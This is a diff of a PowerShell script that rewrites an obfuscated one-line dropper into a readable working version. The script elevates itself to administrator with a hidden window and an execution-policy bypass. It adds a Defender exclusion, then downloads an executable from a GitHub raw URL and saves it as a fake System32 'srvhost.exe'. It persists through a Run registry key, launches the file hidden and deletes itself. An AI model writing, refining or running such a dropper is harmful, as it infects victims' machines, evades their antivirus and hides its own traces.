@@ -1,1 +1,10 @@
-I`f (-N`OT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) { S`TART-Pro`cess powershell -A "-NoP -Ep Bypass -W Hidden -F `"$($MyInvocation.MyCommand.Path)`"" -V RunAs; E`XIT }; $p = "C:\Windows\System32\srvhost.exe"; I`F (!(T`EST-Pa`th $p)) { I`EX (N`EW-Ob`ject Net.WebClient).DownloadString('https://raw.githubusercontent.com/Rdthaiphno064/mmb/refs/heads/main/modules/fl.exe') | O`UT-F`ile $p }; S`ET-It`emProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "srvhost" -Value $p -Force; I`EX "Add-MpPreference -ExclusionPath '$p'"; S`TART-Pro`cess $p -W Hidden; R`M $MyInvocation.MyCommand.Path -Force
+if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
+    Start-Process powershell "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$($MyInvocation.MyCommand.Path)`"" -Verb RunAs
+    exit
+}
+$p = "$env:SystemRoot\System32\srvhost.exe"
+Add-MpPreference -ExclusionPath $p
+if (!(Test-Path $p)) { (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/Rdthaiphno064/mmb/refs/heads/main/modules/fl.exe', $p) }
+Set-ItemProperty "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "srvhost" -Value 'powershell -ep Bypass -WindowStyle Hidden -Command "& \"$p\""' -Force
+Start-Process $p -WindowStyle Hidden
+Remove-Item $MyInvocation.MyCommand.Path -Force
